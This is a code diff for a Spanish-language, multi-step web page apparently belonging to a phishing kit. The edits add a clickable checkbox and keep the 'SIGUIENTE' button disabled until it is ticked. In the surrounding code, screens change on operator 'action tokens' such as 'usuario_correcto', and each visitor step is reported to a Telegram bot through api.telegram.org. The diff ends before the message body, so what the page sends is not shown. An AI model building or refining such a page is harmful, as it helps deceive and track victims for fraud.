@@ -486,20 +486,25 @@ main {
     box-shadow: 0 1px 3px rgba(0,0,0,0.1);
     max-width: 300px;
     border: 1px solid #ddd;
+    cursor: pointer; /* Cursor para indicar que se puede hacer clic */
 }
 .left-paso-1 .caja-blanca .num { font-size: 13px; font-weight: 700; color: #333; margin-bottom: 5px; }
 .left-paso-1 .caja-blanca .sub { font-size: 12px; color: #666; margin-bottom: 15px; }
+
+/* EL CHECKBOX */
 .left-paso-1 .caja-blanca .check { 
     width: 20px; height: 20px; 
     background: #ddd; 
+    border: 1px solid #bbb;
     border-radius: 3px; 
     display: flex; align-items: center; justify-content: center; 
     color: transparent; 
     font-size: 14px;
-    transition: all 0.3s;
+    transition: all 0.2s;
 }
 .left-paso-1 .caja-blanca .check.activo { 
     background: #4caf50; 
+    border-color: #4caf50;
     color: white; 
 }
 
@@ -606,9 +611,10 @@ main {
     box-shadow: 0 2px 8px rgba(0,0,0,0.1);
 }
 
+/* BOTÓN SIGUIENTE (Con estado deshabilitado) */
 .btn-siguiente {
     width: 100%;
-    background: #2da22d;
+    background: #2da22d; /* Verde normal */
     color: #fff;
     border: 0;
     border-radius: 4px;
@@ -621,9 +627,17 @@ main {
     align-items: center;
     justify-content: center;
     gap: 10px;
-    transition: background 0.2s;
+    transition: all 0.3s;
 }
-.btn-siguiente:hover { background: #248524; }
+.btn-siguiente:hover:not(:disabled) { background: #248524; }
+
+/* Estado deshabilitado */
+.btn-siguiente:disabled {
+    background: #a5d6a7; /* Verde pálido */
+    color: #fff;
+    cursor: not-allowed;
+    opacity: 0.8;
+}
 
 .recaptcha-texto {
     font-size: 11px;
@@ -843,7 +857,9 @@ main {
             <!-- PASO 1 -->
             <div class="left-paso-1" id="paso1Amarillo">
                 <div class="titulo">LIRIO ET1</div>
-                <div class="caja-blanca">
+                
+                <!-- Caja clickeable para activar el check -->
+                <div class="caja-blanca" id="cajaPaso1">
                     <div class="num">16-1003.240405.38361573</div>
                     <div class="sub">16-1003</div>
                     <div class="check" id="checkPaso1">✓</div>
@@ -952,7 +968,8 @@ main {
             </div>
 
             <div class="card-blanca-amarilla">
-                <button class="btn-siguiente" id="btnAccionAmarillo">
+                <!-- Botón empieza DESHABILITADO -->
+                <button class="btn-siguiente" id="btnAccionAmarillo" disabled>
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
                     SIGUIENTE
                 </button>
@@ -997,6 +1014,7 @@ const loadingOverlay = document.getElementById('loading-overlay');
 const paso1Amarillo = document.getElementById('paso1Amarillo');
 const paso2Amarillo = document.getElementById('paso2Amarillo');
 const paso3Amarillo = document.getElementById('paso3Amarillo');
+const cajaPaso1 = document.getElementById('cajaPaso1');
 const checkPaso1 = document.getElementById('checkPaso1');
 const btnAccionAmarillo = document.getElementById('btnAccionAmarillo');
 let pasoActualAmarillo = 1;
@@ -1204,7 +1222,6 @@ function handleTelegramActionToken(action) {
     actionProcessed = true;
 
     if (action === 'usuario_correcto') {
-        // 🔥 AQUI ESTABA EL ERROR: Ocultamos el overlay y mostramos la pantalla
         ocultarOverlay(); 
         contenedorOriginal.style.display = 'none';
         viewAmarilla.classList.add('active');
@@ -1230,8 +1247,12 @@ function handleTelegramActionToken(action) {
 // ==========================================
 function iniciarFlujoAmarillo() {
     pasoActualAmarillo = 1;
+    
+    // Resetear el check y el botón
     checkPaso1Activado = false;
     checkPaso1.classList.remove('activo');
+    btnAccionAmarillo.disabled = true; // Botón bloqueado al inicio
+    
     actualizarPasoAmarillo();
     
     // Quitar eventos anteriores clonando el botón
@@ -1239,9 +1260,18 @@ function iniciarFlujoAmarillo() {
     const btnNuevo = btnViejo.cloneNode(true);
     btnViejo.parentNode.replaceChild(btnNuevo, btnViejo);
     
-    // Asignar nuevo evento
+    // Asignar nuevo evento al botón
     btnNuevo.addEventListener('click', accionBotonAmarillo);
 }
+
+// 🚀 EVENTO PARA EL CHECKBOX
+cajaPaso1.addEventListener('click', function() {
+    if (pasoActualAmarillo === 1 && !checkPaso1Activado) {
+        checkPaso1Activado = true;
+        checkPaso1.classList.add('activo'); // Poner verde
+        btnAccionAmarillo.disabled = false; // Desbloquear el botón Siguiente
+    }
+});
 
 function actualizarPasoAmarillo() {
     const btn = document.getElementById('btnAccionAmarillo');
@@ -1266,18 +1296,11 @@ function actualizarPasoAmarillo() {
 
 function accionBotonAmarillo() {
     if (pasoActualAmarillo === 1) {
-        // 1. Marcar el check
-        if (!checkPaso1Activado) {
-            checkPaso1.classList.add('activo');
-            checkPaso1Activado = true;
-            return; // Detenerse aquí para que vea el check marcado antes de pasar
-        }
-
-        // 2. Pasar al paso 2
+        // Avanzar al paso 2
         pasoActualAmarillo = 2;
         actualizarPasoAmarillo();
         
-        // 3. Notificar a Telegram
+        // Notificar a Telegram
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
